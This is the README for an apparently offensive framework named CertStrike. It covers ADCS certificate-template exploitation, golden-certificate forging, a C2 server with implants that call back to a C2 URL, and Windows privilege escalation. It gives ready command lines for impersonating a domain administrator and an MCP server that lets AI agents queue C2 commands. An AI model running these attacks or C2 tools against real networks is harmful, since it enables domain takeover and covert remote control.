# CertStrike

Next-generation PKI, certificate, and mobile attack framework with integrated C2 capabilities.

## Features

### ADCS / PKI Exploitation
- **Native LDAP enumeration** of certificate templates (no ldapsearch binary dependency)
- **ESC1-ESC4 vulnerability detection** with automatic scoring (ESC4 flags templates with security descriptors for manual SDDL/ACE review — does not parse ACEs)
- **ESC1 exploitation**: forge certificates with arbitrary UPN via misconfigured templates
- **ESC4 exploitation**: modify template ACLs → exploit as ESC1 → auto-restore
- **Attack chain auto-detection**: scan all templates, score vulnerabilities, output prioritized attack paths
- **Golden certificate forging** with UPN SAN for smart card / Kerberos PKINIT authentication

### C2 Framework
- HTTP/HTTPS listeners with auto-generated self-signed TLS certificates
- Implant session management: registration, polling, command queue, result collection
- **Certificate persistence**: cert-auth implants authenticate via forged certificates (Schannel mTLS)
- Stager configuration generation

### Mobile Exploitation
- **ClearBrite** forensic-grade logical device extraction via ADB
- Zero-click exploit **simulation** for research (Pegasus, Predator, Chrysaor attack chain simulation — print-only, no real exploitation)

### MCP Server
6 tools for agentic integration: `pki_enumerate`, `pki_forge`, `c2_list_sessions`, `c2_queue_command`, `c2_get_results`, `mobile_extract`

### Operator Console
Bubbletea-based TUI with views: Sessions, Commands, Listeners, Implants. Starts empty, populated by live C2 sessions.

### SmartPotato
All-in-one Windows privilege escalation: JuicyPotato, RoguePotato, SweetPotato with auto-detection

## Quick Start

```bash
# Build
CGO_ENABLED=0 go build -o certstrike ./cmd/certstrike

# Enumerate ADCS templates
./certstrike pki --enum --target-dc dc01.corp.local --domain corp.local --username user --password pass

# Auto-detect ESC vulnerabilities
./certstrike pki --auto-detect --target-dc dc01.corp.local --domain corp.local --username user --password pass

# Exploit ESC1
./certstrike pki --exploit esc1 --template VulnTemplate --upn administrator@corp.local \
  --target-dc dc01.corp.local --domain corp.local --username user --password pass

# Forge golden certificate
./certstrike pki --forge --upn admin@corp.local --output admin.pem

# Start C2 listener
./certstrike c2 --port 8443 --protocol https

# Generate cert-auth implant
./certstrike c2 --implant-type cert-auth --upn admin@corp.local --c2-url https://c2:8443

# Launch operator console
./certstrike console

# Start MCP server
./certstrike mcp

# Mobile extraction
./certstrike mobile --extract --device-id emulator-5554 --output-dir ./extraction
```

## Architecture

```
cmd/certstrike/     CLI entry points (cobra)
pkg/pki/            ADCS enumeration, ESC exploitation, certificate forging
pkg/c2/             C2 listener, session management, cert-auth implants
pkg/mobile/         ADB extraction (ClearBrite), zero-click simulation
internal/mcp/       MCP stdio server (6 tools)
internal/tui/       Bubbletea operator console
implants/smartpotato/ Windows privilege escalation
```

## Dependencies
All pure Go, CGO_ENABLED=0 compatible:
- `github.com/spf13/cobra` — CLI framework
- `github.com/go-ldap/ldap/v3` — Native LDAP client
- `github.com/charmbracelet/bubbletea` — TUI framework
- `github.com/charmbracelet/lipgloss` — TUI styling
